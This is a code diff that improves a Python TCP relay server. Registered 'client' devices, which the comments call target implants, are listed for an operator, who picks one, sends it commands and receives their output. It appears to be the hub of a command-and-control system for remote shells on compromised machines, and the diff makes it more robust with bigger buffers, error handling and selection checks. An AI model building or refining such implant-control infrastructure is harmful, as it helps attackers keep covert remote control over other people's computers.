@@ -1,108 +1,142 @@
 import threading
 import socket
 import os
+
 connections = {}
 client_count = 0
 server_count = 0
 
 HOST = "0.0.0.0"
 PORT = int(os.environ.get("PORT", 5432))
-bridge = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-bridge.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
+bridge = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+bridge.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 bridge.bind((HOST, PORT))
 bridge.listen()
 print(f"Server is listening on: {HOST}, {PORT}")
 
 def sendMessage(conn, target):
     while True:
-        cmd = conn.recv(1029).decode().strip()
+        try:
+            # Read up to 8KB of data to prevent long command payload clipping
+            raw_cmd = conn.recv(8192)
+            if not raw_cmd:
+                break
+                
+            cmd = raw_cmd.decode('utf-8', errors='ignore').strip()
+            if not cmd:
+                continue
 
-        if not cmd:
-            continue
+            # Forward raw string payload exactly as it arrived to target implant
+            target.sendall(raw_cmd)
 
-        target.sendall(cmd.encode())
+            if cmd == "exit":
+                conn.sendall(b"Disconnected from client\n")
+                return
 
-        if cmd == "exit":
-            conn.sendall(b"Disconnected from client")
-            return
-
-        reply = target.recv(1029).decode().strip()
-        conn.sendall(reply.encode())
+            # Capture up to 64KB response window from target payload to handle large directory ls readouts
+            raw_reply = target.recv(65536)
+            if not raw_reply:
+                conn.sendall(b"Target connection lost unexpectedly\n")
+                return
+                
+            conn.sendall(raw_reply)
+        except (OSError, ConnectionError):
+            break
 
 def askOpt(conn):
     clients = [name for name in connections if name.startswith("client")]
     if not clients:
-        conn.sendall(b"No targets connected")
+        conn.sendall(b"No targets connected\n")
         return
-    menu = "\n".join(
-f"{c}|{targets}" for c, targets in enumerate(clients, start=1)
-)
-    conn.sendall(menu.encode())
+        
+    # Append trailing newline explicitly so server controller terminates read loops cleanly
+    menu = "\n".join(f"{c}|{targets}" for c, targets in enumerate(clients, start=1)) + "\n"
+    conn.sendall(menu.encode('utf-8'))
+    
     while True:
-        data = conn.recv(1029).decode().strip()
-        if not data:
+        try:
+            raw_data = conn.recv(1029)
+            if not raw_data:
+                break
+            data = raw_data.decode('utf-8', errors='ignore').strip()
+            if not data:
+                continue
+            if data == "exit":
+                return
+            if data == "list":
+                conn.sendall(b"Please select a target number, or type exit\n")
+                continue
+                
+            try:
+                index = int(data) - 1
+            except ValueError:
+                conn.sendall(b"invalid selection: please enter a number\n")
+                continue
+                
+            if index < 0 or index >= len(clients):
+                conn.sendall(b"invalid selection\n")
+                continue
+                
+            name = clients[index]
+            if name not in connections:
+                conn.sendall(b"Target disconnected. Refresh the list.\n")
+                return
+                
+            target = connections[name]
+            conn.sendall(f"Selected target {data}\n".encode('utf-8'))
+            sendMessage(conn, target)
+            return
+        except (OSError, ConnectionError):
             break
-        if data == "exit":
-            return
-        if data == "list":
-            conn.sendall(b"Please select a target number, or type exit")
-            continue
-        index = int(data) - 1
-        if index < 0 or index >= len(clients):
-            conn.sendall(b"invalid selection")
-            continue
-        name = clients[index]
-        if name not in connections:
-            conn.sendall(b"Target disconnected. Refresh the list.")
-            return
-        target = connections[name]
-        conn.sendall(f"Selected target {data}".encode())
-        sendMessage(conn, target)
-        return
 
 def handle_client(conn):
     global client_count
     global server_count
+    identity = None
     try:
         while True:
-            data = conn.recv(1029).decode().strip().lower()
-            if not data:
+            raw_data = conn.recv(1029)
+            if not raw_data:
                 break
+                
+            data = raw_data.decode('utf-8', errors='ignore').strip().lower()
+            if not data:
+                continue
 
             if data == "client":
-                client_count += 1 #adds an id to the new device
-                identity = data + str(client_count)
+                client_count += 1
+                identity = f"client{client_count}"
                 connections[identity] = conn
+                print(f"Registered device: {identity}")
+                continue
 
             if data == "server":
                 server_count += 1
-                identity = data + str(server_count)
+                identity = f"server{server_count}"
                 connections[identity] = conn
+                print(f"Registered panel session: {identity}")
+                continue
 
             if data == "list":
                 askOpt(conn)
-            print(data)
+                
     except Exception as e:
-            print(f"Error type: {type(e).__name__}")
-            raise
+        print(f"Connection thread exception dropped: {type(e).__name__} -> {e}")
     finally:
-        for identity, sock in list(connections.items()):
-            if sock is conn:
-                del connections[identity]
-                break
+        if identity and identity in connections:
+            del connections[identity]
         conn.close()
+        print(f"Cleaned up session endpoint link context.")
 
 def handle_connection():
-    global client_count
     while True:
         try:
-            conn,addr = bridge.accept()
+            conn, addr = bridge.accept()
             c = threading.Thread(target=handle_client, args=(conn,), daemon=True)
             c.start()
-            print(f"Connected: {addr}")
+            print(f"Connected incoming gateway pipe from: {addr}")
         except Exception as e:
-            print(f"An error occoured: {e}")
+            print(f"Acceptance block warning: {e}")
 
 t = threading.Thread(target=handle_connection, daemon=False)
 t.start()
-
